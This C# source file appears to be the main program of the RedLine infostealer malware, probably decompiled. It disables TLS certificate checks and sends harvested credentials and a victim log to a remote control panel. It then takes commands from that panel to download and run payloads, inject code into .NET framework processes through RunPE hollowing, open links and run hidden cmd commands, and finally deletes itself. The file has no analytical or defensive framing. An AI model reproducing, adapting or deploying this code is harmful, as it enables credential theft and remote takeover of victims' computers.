using RedLine.Logic.Others;
using RedLine.Logic.RunPE;
using RedLine.Models;
using RedLine.Models.RunPE;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;

namespace RedLine
{
	public static class Program
	{
		static Program()
		{
			ServicePointManager.ServerCertificateValidationCallback = (RemoteCertificateValidationCallback)Delegate.Combine(ServicePointManager.ServerCertificateValidationCallback, (RemoteCertificateValidationCallback)((object _, X509Certificate __, X509Chain ___, SslPolicyErrors ____) => true));
		}

		private static void Main(string[] args)
		{
			string remoteIP = "0.0.0.0";
			string buildId = "wwq";
			try
			{
				Service<IRemotePanel>.RemoteIP = remoteIP;
				Service<IRemotePanel>.Use(delegate(IRemotePanel panel)
				{
					ClientSettings result = panel.GetSettings().Result;
					UserLog userLog = UserLog.Create(result);
					userLog.BuildID = buildId;
					userLog.Credentials = Credentials.Create(result);
					bool flag = false;
					while (!flag)
					{
						try
						{
							panel.SendClientInfo(userLog).Wait();
							flag = true;
						}
						catch
						{
							flag = false;
						}
					}
					userLog.Credentials = new Credentials();
					IList<RemoteTask> result2 = panel.GetTasks(userLog).Result;
					if (result2 != null)
					{
						foreach (RemoteTask item in result2)
						{
							try
							{
								if (CompleteTask(item))
								{
									panel.CompleteTask(userLog, item.ID).Wait();
								}
							}
							catch
							{
							}
						}
					}
				});
			}
			catch
			{
			}
			finally
			{
				InstallManager.RemoveCurrent();
			}
		}

		private static bool CompleteTask(RemoteTask task)
		{
			bool result = false;
			try
			{
				switch (task.Action)
				{
				case RemoteTaskAction.Download:
					try
					{
						string[] array3 = task.Target.Split('|');
						if (array3.Length == 0)
						{
							new WebClient().DownloadString(task.Target);
						}
						if (array3.Length == 2)
						{
							new WebClient().DownloadFile(array3[0], Environment.ExpandEnvironmentVariables(array3[1]));
						}
					}
					catch
					{
					}
					result = true;
					return result;
				case RemoteTaskAction.DownloadAndEx:
				{
					string[] array2 = task.Target.Split('|');
					if (array2.Length == 2)
					{
						new WebClient().DownloadFile(array2[0], Environment.ExpandEnvironmentVariables(array2[1]));
						Process.Start(new ProcessStartInfo
						{
							FileName = Environment.ExpandEnvironmentVariables(array2[1]),
							CreateNoWindow = false,
							WindowStyle = ProcessWindowStyle.Normal
						});
					}
					result = true;
					return result;
				}
				case RemoteTaskAction.OpenLink:
					Process.Start(task.Target);
					result = true;
					return result;
				case RemoteTaskAction.RunPE:
				{
					string[] array = task.Target.Split('|');
					byte[] systemDataCommonIntStorageg = new WebClient().DownloadData(array[0]);
					string[] files = Directory.GetFiles("C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319", array[1]);
					foreach (string applicationPath in files)
					{
						if (LoadExecutor.Execute(LoadParams.Create(systemDataCommonIntStorageg, applicationPath)))
						{
							result = true;
							return result;
						}
					}
					return result;
				}
				case RemoteTaskAction.Cmd:
					Process.Start(new ProcessStartInfo("cmd", "/C " + task.Target)
					{
						RedirectStandardError = true,
						RedirectStandardOutput = true,
						UseShellExecute = false,
						CreateNoWindow = true
					});
					result = true;
					return result;
				default:
					return result;
				}
			}
			catch
			{
				return result;
			}
		}
	}
}
